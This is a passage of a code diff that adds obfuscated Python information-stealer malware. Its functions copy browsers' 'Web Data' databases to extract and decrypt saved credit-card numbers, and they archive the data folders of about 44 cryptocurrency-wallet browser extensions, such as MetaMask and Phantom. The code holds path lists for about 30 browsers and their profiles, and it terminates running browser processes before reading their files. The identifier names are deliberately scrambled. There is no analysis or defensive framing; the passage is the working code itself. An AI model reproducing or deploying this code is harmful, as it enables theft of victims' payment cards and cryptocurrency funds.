+            VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI.append(f"{NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO}\n{EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA}\n{YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name}\n")
+            GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC += 1
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.close()
+    
+    def JQLFERMYBWVDGWJLFWEVUXUSHIPLAQOTJDIMDQXIIKKNRYUJKLAJPLNVRECBXVQBCWGRUVV(YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG):
+        global QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU
+        AHCATRRDZTNXJJYLFCDZMSOPJFVSYLLVATZUHKZRVZPLWYONXCCMUVQZGWIHPMOUUZRSKQZCLSEORCAFAQTQ = os.path.join(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, 'Web Data')
+        if not os.path.exists(AHCATRRDZTNXJJYLFCDZMSOPJFVSYLLVATZUHKZRVZPLWYONXCCMUVQZGWIHPMOUUZRSKQZCLSEORCAFAQTQ):
+            return
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ = sqlite3.connect(":memory:")
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV = sqlite3.connect(AHCATRRDZTNXJJYLFCDZMSOPJFVSYLLVATZUHKZRVZPLWYONXCCMUVQZGWIHPMOUUZRSKQZCLSEORCAFAQTQ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.backup(WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.close()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI = WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.cursor()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+
+        for v4r_row in QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.fetchall():
+            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
+                continue
+            QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF =             f"- Name             : {v4r_row[0]}"
+            ENAOBWYKBAHLOYTTBHMRAJKCKNIQQQBWFYBLJTWYCNMQEBQTNQHCAHBKXKYWJFQSZZZIDRTANKSILSEPAO = f"  Expiration Month : {v4r_row[1]}"
+            LUEWDGASSSCZUGLCQLPXUWRMFNDEFCBDGMEFOHUYURGBZOWGNHAJARBOEENLVMWNRQQLLGRSNYDZMCQNDY =  f"  Expiration Year  : {v4r_row[2]}"
+            ULQJRODUBPWHCDQUCGCJMDAZPWPJHBALYNBPXEVAVKGGZYQHAQHDGMHPQHHJJIVQXHHRFJ =      f"  Card Number      : {FPRCCTPOILPWASZPIGQNYELXAZENAMYTIPVYHBUZFVYUFUHEIZYSQKHFZEMFOIWKGDTDJIRHMKCHHWNFNFFLZTWWDQNQ(v4r_row[3], UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG)}"
+            YTYHJXVUEYPBOKUIJXLAMGEBDXDQXVBJZYAADBJCFWVGKESROVQUBTNRGPRQOWCTN =    f"  Date Modified    : {v4r_row[4]}"
+            YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name =     f"  Browser          : {YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO}"
+            AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY.append(f"{QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF}\n{ENAOBWYKBAHLOYTTBHMRAJKCKNIQQQBWFYBLJTWYCNMQEBQTNQHCAHBKXKYWJFQSZZZIDRTANKSILSEPAO}\n{LUEWDGASSSCZUGLCQLPXUWRMFNDEFCBDGMEFOHUYURGBZOWGNHAJARBOEENLVMWNRQQLLGRSNYDZMCQNDY}\n{ULQJRODUBPWHCDQUCGCJMDAZPWPJHBALYNBPXEVAVKGGZYQHAQHDGMHPQHHJJIVQXHHRFJ}\n{YTYHJXVUEYPBOKUIJXLAMGEBDXDQXVBJZYAADBJCFWVGKESROVQUBTNRGPRQOWCTN}\n{YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name}\n")
+            QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU += 1
+        
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.close()
+
+    def BFKGVKLKSENQXOFNLWXYHTAXSNACXQXFUARYKECITWTHRQSWCEFSLSEXKO(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN, VYYJMOGJMHWVWTUVYAVVRHDMKQNFMTDRLOMMNBYSSVHOQULRZOXXJLRDYBIFIFCHTIAHPHIFEXWKIJWKZKYFAUQ, YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB):
+        global VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ
+        QUAREZVHJDCZXFRJXVJZGCKSKHBQSWPFAKSOXBJTTUGJBHOGEGRRWOHDXDBXTQWTMLMEKOAAWQCECPBPQRIGCZITCHHBRQYC = os.path.join(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, 'Extensions')
+        CFZCITWEGFXQXZGEBAJDSXVRPXLHWLOQFWAOPEBFYLJSLIGSGSBPJPNBTWYGNRGMIFIWTVLXTQPICDYSKEVOTZVXOKSAHSI = os.path.join("Extensions", YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO)
+
+        if not os.path.exists(QUAREZVHJDCZXFRJXVJZGCKSKHBQSWPFAKSOXBJTTUGJBHOGEGRRWOHDXDBXTQWTMLMEKOAAWQCECPBPQRIGCZITCHHBRQYC):
+            return 
+
+        ERFZJRYHFMUUGETYWLNAPGKCMWAZKOWAGHOTDIZRHEXONMSLOEMZWJNUEXJNAODRUBUVLKYQOVCHAWITAPWCGUAOMYPYOKVYD = [v4r_item for v4r_item in os.listdir(QUAREZVHJDCZXFRJXVJZGCKSKHBQSWPFAKSOXBJTTUGJBHOGEGRRWOHDXDBXTQWTMLMEKOAAWQCECPBPQRIGCZITCHHBRQYC) if os.path.isdir(os.path.join(QUAREZVHJDCZXFRJXVJZGCKSKHBQSWPFAKSOXBJTTUGJBHOGEGRRWOHDXDBXTQWTMLMEKOAAWQCECPBPQRIGCZITCHHBRQYC, v4r_item))]
+        
+        for v4r_extention in ERFZJRYHFMUUGETYWLNAPGKCMWAZKOWAGHOTDIZRHEXONMSLOEMZWJNUEXJNAODRUBUVLKYQOVCHAWITAPWCGUAOMYPYOKVYD:
+            if "Temp" in v4r_extention:
+                continue
+            
+            VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ += 1
+            VAOYLYQVTUUDAZGYMDDZYTUYICQGRRFAHKOXZFZILTNSNXOLFTXJYIECGCZFUSAHVUFQJVFN = False
+            
+            for v4r_extension_name, v4r_extension_folder in VYYJMOGJMHWVWTUVYAVVRHDMKQNFMTDRLOMMNBYSSVHOQULRZOXXJLRDYBIFIFCHTIAHPHIFEXWKIJWKZKYFAUQ:
+                if v4r_extention == v4r_extension_folder:
+                    VAOYLYQVTUUDAZGYMDDZYTUYICQGRRFAHKOXZFZILTNSNXOLFTXJYIECGCZFUSAHVUFQJVFN = True
+                    
+                    ZCZSHJKIMWJJUBFPKCROGVXBUDRKDGGONGFPKKWEHHTPVPXEXCQFUTZVSERTGXY = os.path.join(CFZCITWEGFXQXZGEBAJDSXVRPXLHWLOQFWAOPEBFYLJSLIGSGSBPJPNBTWYGNRGMIFIWTVLXTQPICDYSKEVOTZVXOKSAHSI, v4r_extension_name, v4r_extention)
+                    
+                    HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW = os.path.join(QUAREZVHJDCZXFRJXVJZGCKSKHBQSWPFAKSOXBJTTUGJBHOGEGRRWOHDXDBXTQWTMLMEKOAAWQCECPBPQRIGCZITCHHBRQYC, v4r_extention)
+                    for v4r_item in os.listdir(HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW):
+                        AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO = os.path.join(HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW, v4r_item)
+                        
+                        if os.path.isdir(AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO):
+                            for dirpath, dirnames, filenames in os.walk(AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO):
+                                for filename in filenames:
+                                    file_path = os.path.join(dirpath, filename)
+                                    arcname = os.path.relpath(file_path, HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW)
+                                    EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.write(file_path, os.path.join(ZCZSHJKIMWJJUBFPKCROGVXBUDRKDGGONGFPKKWEHHTPVPXEXCQFUTZVSERTGXY, arcname))
+                        else:
+                            EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.write(AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO, os.path.join(ZCZSHJKIMWJJUBFPKCROGVXBUDRKDGGONGFPKKWEHHTPVPXEXCQFUTZVSERTGXY, v4r_item))
+                    break
+
+            if not VAOYLYQVTUUDAZGYMDDZYTUYICQGRRFAHKOXZFZILTNSNXOLFTXJYIECGCZFUSAHVUFQJVFN:
+                TTHHCYLSFPNUBHBDCUEDSFNOMWSQWGGEKDHNKJFHEVQKYRENVCYVD = os.path.join(CFZCITWEGFXQXZGEBAJDSXVRPXLHWLOQFWAOPEBFYLJSLIGSGSBPJPNBTWYGNRGMIFIWTVLXTQPICDYSKEVOTZVXOKSAHSI, "Unknown Extension", v4r_extention)
+                
+                HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW = os.path.join(QUAREZVHJDCZXFRJXVJZGCKSKHBQSWPFAKSOXBJTTUGJBHOGEGRRWOHDXDBXTQWTMLMEKOAAWQCECPBPQRIGCZITCHHBRQYC, v4r_extention)
+                for v4r_item in os.listdir(HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW):
+                    AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO = os.path.join(HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW, v4r_item)
+                    
+                    if os.path.isdir(AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO):
+                        for dirpath, dirnames, filenames in os.walk(AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO):
+                            for filename in filenames:
+                                file_path = os.path.join(dirpath, filename)
+                                arcname = os.path.relpath(file_path, HDJVTHEJAMZDLRBJWKIYEIWGJUZZTLYFCCAHEBOUGDVCAXNLXLRWRYDBJFVDOTPEW)
+                                EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.write(file_path, os.path.join(TTHHCYLSFPNUBHBDCUEDSFNOMWSQWGGEKDHNKJFHEVQKYRENVCYVD, arcname))
+                    else:
+                        EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN.write(AGZPHTSZJEHXMTGWAMHZTIGXWXFBODPTXNVFRDATXHNMJJXILRAMZFHMYSPSBMCAPBO, os.path.join(TTHHCYLSFPNUBHBDCUEDSFNOMWSQWGGEKDHNKJFHEVQKYRENVCYVD, v4r_item))
+
+    YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_files = [
+        ("Google Chrome",          os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
+        ("Google Chrome SxS",      os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
+        ("Google Chrome Beta",     os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
+        ("Google Chrome Dev",      os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
+        ("Google Chrome Unstable", os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
+        ("Google Chrome Canary",   os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
+        ("Microsoft Edge",         os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
+        ("Opera",                  os.path.join(UBYLEOOXGKEUARAUZESDNQFHTZMFHFFVYIKNMJTQISZPOATEZWUNMILCS, "Opera Software", "Opera Stable"),                "opera.exe"),
+        ("Opera GX",               os.path.join(UBYLEOOXGKEUARAUZESDNQFHTZMFHFFVYIKNMJTQISZPOATEZWUNMILCS, "Opera Software", "Opera GX Stable"),             "opera.exe"),
+        ("Opera Neon",             os.path.join(UBYLEOOXGKEUARAUZESDNQFHTZMFHFFVYIKNMJTQISZPOATEZWUNMILCS, "Opera Software", "Opera Neon"),                  "opera.exe"),
+        ("Brave",                  os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
+        ("Vivaldi",                os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
+        ("Internet Explorer",      os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
+        ("Amigo",                  os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Amigo", "User Data"),                            "amigo.exe"),
+        ("Torch",                  os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Torch", "User Data"),                            "torch.exe"),
+        ("Kometa",                 os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Kometa", "User Data"),                           "kometa.exe"),
+        ("Orbitum",                os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Orbitum", "User Data"),                          "orbitum.exe"),
+        ("Cent Browser",           os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
+        ("7Star",                  os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "7Star", "7Star", "User Data"),                   "7star.exe"),
+        ("Sputnik",                os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
+        ("Epic Privacy Browser",   os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
+        ("Uran",                   os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
+        ("Yandex",                 os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
+        ("Yandex Canary",          os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
+        ("Yandex Developer",       os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
+        ("Yandex Beta",            os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
+        ("Yandex Tech",            os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
+        ("Yandex SxS",             os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
+        ("Iridium",                os.path.join(IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA,   "Iridium", "User Data"),                          "iridium.exe"),
+        ("Mozilla Firefox",        os.path.join(UBYLEOOXGKEUARAUZESDNQFHTZMFHFFVYIKNMJTQISZPOATEZWUNMILCS, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
+        ("Safari",                 os.path.join(UBYLEOOXGKEUARAUZESDNQFHTZMFHFFVYIKNMJTQISZPOATEZWUNMILCS, "Apple Computer", "Safari"),                      "safari.exe"),
+    ]
+
+    UYUIXVOIRFJKESGRTTXJBDQXUBMMKAPHQRMWXZWSAORHNLHBCWBUJQHXDKCDYKTWGQHVLHMGPE = [
+        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
+    ]
+
+    VYYJMOGJMHWVWTUVYAVVRHDMKQNFMTDRLOMMNBYSSVHOQULRZOXXJLRDYBIFIFCHTIAHPHIFEXWKIJWKZKYFAUQ = [
+        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
+        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
+        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
+        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
+        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
+        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
+        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
+        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
+        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
+        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
+        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
+        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
+        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
+        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
+        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
+        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
+        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
+        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
+        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
+        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
+        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
+        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
+        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
+        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
+        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
+        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
+        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
+        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
+        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
+        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
+        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
+        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
+        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
+        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
+        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
+        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
+        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
+        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
+        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
+        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
+        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
+        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
+    ]
+    
+    try:
+        for QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO, v4r_proc_name in YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_files:
+            for v4r_proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if v4r_proc.name().lower() == v4r_proc_name.lower():
+                        v4r_proc.terminate()
+                except:
+                    pass
+    except:
+        pass
+
+    for QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF, NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO, v4r_proc_name in YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_files:
+        if not os.path.exists(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO):
+            continue
+
